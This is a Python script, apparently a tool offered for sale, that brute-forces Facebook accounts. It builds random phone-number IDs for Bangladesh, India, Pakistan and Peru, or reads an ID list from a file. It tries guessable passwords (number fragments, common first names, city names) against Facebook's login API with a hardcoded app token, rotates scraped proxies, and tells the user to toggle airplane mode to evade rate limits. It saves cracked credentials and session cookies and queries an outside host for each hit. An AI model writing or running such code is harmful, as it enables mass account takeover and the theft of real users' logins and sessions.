#SC MAKE BY HABIB HOSSAIN
#WORKING SCRIPT SELLER
#__________________IMPORT____________#
import os,random
import sys,time,uuid
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    print('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
#________________PROXY______________#
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=1000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
#________________LOOP______________#
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]
#________________COLOUR______________#
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
#__________________LINE____________#
def linex():
    print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
        os.system(f'clear')
        print(logo)
#________________UA______________#
def sex():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	ua = "[FBAN/;FBAV/;FBBV/911947498;FBAN/FBAN;FBAV/;FBBV/911947498;FBDM//*{density=3.0,width=1080,height=4096};FBLC/zh_CN;FBRV/158580442;FBCR/OPPO;FBMF/Motorola;FBBD/iPhone;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_12U;FBSV/14;FBOP/8;FBCA/arm64-v8a;FBSS/;]"+"[FB4A/;FBAV/4Q095MQG;FBBV/721212583;FBAN/FB4A;FBAV/4Q095MQG;FBBV/721212583;FBDM//*{density=2.0,width=720,height=1280};FBLC/es_ES;FBRV/779797464;FBCR/OPPO;FBMF/VIVO;FBBD/Medion;FBPN/com.facebook.katana;FBDV/Realme_X7;FBSV/15;FBOP/8;FBCA/arm64-v8a;FBSS/19;]"+"[FBAN/;FBAV/A1XDL5U4;FBBV/833308644;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/833308644;FBDM//*{density=3.0,width=2560,height=2560};FBLC/ru_RU;FBRV/733815313;FBCR/LG;FBMF/OnePlus;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_F52;FBSV/17;FBOP/6;FBCA/armeabi;FBSS/12;]"+"[FBAN/;FBAV/A1XDL5U4;FBBV/837881959;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/837881959;FBDM//*{density=3.0,width=1440,height=1280};FBLC/zh_CN;FBRV/745188678;FBCR/OPPO;FBMF/Apple;FBBD/Gigaset;FBPN/com.facebook"+"[FB4A/;FBAV/;FBBV/920666606;FBAN/FB4A;FBAV/;FBBV/920666606;FBDM//*{density=3.0,width=720,height=4096};FBLC/de_DE;FBRV/475075800;FBCR/Realme;FBMF/Xiaomi;FBBD/Realme;FBPN/com.facebook.katana;FBDV/Nokia_X110;FBSV/15;FBOP/5;FBCA/x86;FBSS/20;]"
	return ua
#__________________LOGO____________#
logo=(f"""
 {A}LK LK LK LK LK LK LK LK LK LK LK LK LK
 {A}LK LK LK LK LK LK LK LK LK LK LK LK LK
 {G1}LK LK LK LK LK LK LK LK LK LK LK LK LK
 {G1}LK LK LK LK LK LK LK LK LK LK LK LK LK
 {A}LK LK LK LK LK LK LK LK LK LK LK LK LK 
 {A}LK LK LK LK LK LK LK LK LK LK LK LK LK
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{A} PsicoLoko 
{G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{A} FILE 
{G1}[{A}≈{G1}]{G1} VERSION   {A}➢ 1
{G1}[{A}≈{G1}]{G1} STATUS    {A}➢{A} ON
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________MAIN____________#
def menu():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} FILE CLONE ')
    print(f'{G1}[{A}2{G1}]{G1} RANDOM CLONE ')
    print(f'{G1}[{A}3{G1}]{G1} CONTACT OWNER ')
    print(f'{G1}[{A}0{G1}]{G1} EXIT TOOL ')
    linex()
    sex = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
    if sex in ['1']:
        file()
    elif sex in ['2']:
        XXX()
    elif sex in ['3']:
        os.system('xdg-open https://www.facebook.com/sk.sahathat');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()
#__________________RANDOM DEF____________#
def XXX():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONE')
    print(f'{G1}[{A}2{G1}]{G1} INDIA CLONE')
    print(f'{G1}[{A}3{G1}]{G1} PAKISTAN CLONE')
    print(f'{G1}[{A}4{G1}]{G1} PERU CLONE')
    print(f'{G1}[{A}0{G1}]{G1} BACK MENU');linex()
    sex = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
    if sex in ['1']:
        bd()
    elif sex in ['2']:
        India()
    elif sex in ['3']:
        Pakistan()
    elif sex in ['4']:
        Peru()
    elif sex in ['0']:
        menu()
    else:
        XXX()

#__________________PAKISTAN DEF____________#
def Pakistan():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 030{G}/{A}031{G}/{A}032{G}/{A}033');linex()
    code = input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
    for x in range(limit):
        nmp = "".join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
        print(f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for love in user:
            ids = code + love
            psd = [ids,love,ids[:8],ids[:7],ids[:6],love[1:],love[2:], 'pakistan', 'islamabad', 'karachi', 'lahore']
            sexy.submit(randm,ids,psd)
    print(f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    input(f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()

#__________________PERU DEF____________#
def Peru():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 9{G}/{A}51{G}/{A}8');linex()
    code = input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
    for x in range(limit):
        nmp = "".join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
        print(f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for love in user:
            ids = code + love
            psd = [ids,love,ids[:8],ids[:7],ids[:6],love[1:],love[2:], 'peru', 'lima', 'cusco', 'arequipa']
            sexy.submit(randm,ids,psd)
    print(f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    input(f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#__________________BD DEF____________#
def bd():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 017{G}/{A}019{G}/{A}018{G}/{A}016');linex()
    code = input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
        print(f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            xb = love[2:]
            psd = [ids,love,ax,bx,cx,xa,xb,'77889900','bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#__________________INDIA DEF____________#
def India():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} +91639{G}/{A}+91934{G}/{A}+91902{G}/{A}+91701');linex()
    code = input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
        print(f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for love in user:
            ids = code + love
            psd = [love,ids[:8],'57273200','59039200','57575751']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#__________________FILE DEF____________#
def file():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A} NINJA.txt');linex()
    file = input(f'{G1}[{A}?{G1}]{G1} FILE NAME {A}➢{G1} ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{G1}[{A}≈{G1}]{G1} FILE NOT FOUND');time.sleep(1)
        file()
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} {G1}[{A}1-20{G1}]{G1}');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} PASSWORD LIMIT {A}➢{G1} '))
    clear()
    for x in range(limit):
        print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} firstlast{G1}/{A}first123{G1}/{A}last123')
        plist.append(input(f'{G1}[{A}?{G1}]{G1} PASSWORD NO {G1}[{A}{x+1}{G1}]{G1} {A}➢{S} '));linex()
    with ThreadPool(max_workers=30) as sexy:
        tl = str(len(fo))
        clear()
        print(f'{G1}[{A}≈{G1}]{G1} TOTAL ID {A}➢{G1} {tl}')
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for user in fo:
            ids,names = user.split('|')
            psd = plist
            sexy.submit(M1,ids,names,psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#__________________RANDON METHOD____________#
def randm(ids,psd):
    global loop,ok
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}NINJA{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head = {
    'authority': 'x.facebook.com',     
    'method': 'GET',
    'path': '/login/device-based/login/async/',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2007J20CG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1} NINJA-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/ NINJA-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S} NINJA-LK{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
#__________________FILE METHOD____________#
def M1(ids,names,psd):
    global loop,ok
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}NINJA{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for pw in psd:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head = {
    'authority': 'x.facebook.com',     
    'method': 'GET',
    'path': '/login/device-based/login/async/',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2007J20CG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',
}
            po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
            if 'access_token' in po:
                print(f'\r\r{A}[{G1} NINJA-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/ NINJA-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[{M} NINJA-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/ NINJA-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
if __name__ == '__main__':
    menu()
